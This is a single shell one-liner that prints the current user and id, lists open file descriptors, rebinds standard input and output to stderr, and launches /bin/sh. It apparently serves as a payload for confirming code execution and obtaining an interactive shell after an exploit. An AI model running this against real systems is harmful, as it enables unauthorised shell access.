echo Whoami and id say: && whoami && id && ls -als /proc/self/fd && exec 0<&2  1<&2 && ls -als /proc/self/fd && /bin/sh && echo "system executed"
